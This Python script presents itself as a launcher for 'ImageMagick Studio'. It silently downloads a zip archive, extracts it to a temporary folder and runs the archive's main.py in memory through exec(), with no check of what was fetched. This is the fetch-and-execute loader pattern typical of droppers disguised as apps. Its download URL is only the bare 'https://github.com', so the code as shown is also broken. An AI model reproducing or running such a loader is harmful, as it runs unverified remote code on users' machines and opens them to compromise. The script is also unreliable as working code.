import os
import urllib.request
import tempfile
import sys
import zipfile

def run_remote_studio():
    print("=" * 60)
    print("      INITIALIZING IMAGEMAGICK STUDIO VIA REMOTE STREAM")
    print("=" * 60)
    
    # Target URL pointing directly to your GitHub repository's main branch zip archive
    repo_zip_url = "https://github.com"
    
    try:
        with tempfile.TemporaryDirectory() as tmpdir:
            zip_path = os.path.join(tmpdir, "repo.zip")
            print("[*] Streaming core graphical packages from GitHub pipeline... Please wait.")
            
            # Fetch the complete pre-vendored archive silently into a system temp track
            urllib.request.urlretrieve(repo_zip_url, zip_path)
            
            print("[*] Extracting portable runtime architecture arrays...")
            with zipfile.ZipFile(zip_path, 'r') as zip_ref:
                zip_ref.extractall(tmpdir)
            
            # Resolve the dynamic folder string naming format created by GitHub branch exports
            app_root = os.path.join(tmpdir, "ImageMagick-Studio-main", "MagickStudio")
            
            # Set the execution context path and pass control up to the portable app thread
            os.chdir(app_root)
            sys.path.insert(0, app_root)
            
            print("[✓] Environment synchronized. Booting ImageMagick Studio...")
            print("=" * 60 + "\n")
            
            # Dynamically evaluate the master window bootloader directly in memory
            with open("main.py", "r", encoding="utf-8") as f:
                exec(f.read(), {"__name__": "__main__"})
                
    except Exception as e:
        print(f"\n[!] REMOTE EXECUTION CRASH: Failed to stream or execute the application layer.")
        print(f"    Details: {str(e)}")
        input("\nPress Enter to exit...")

if __name__ == "__main__":
    run_remote_studio()
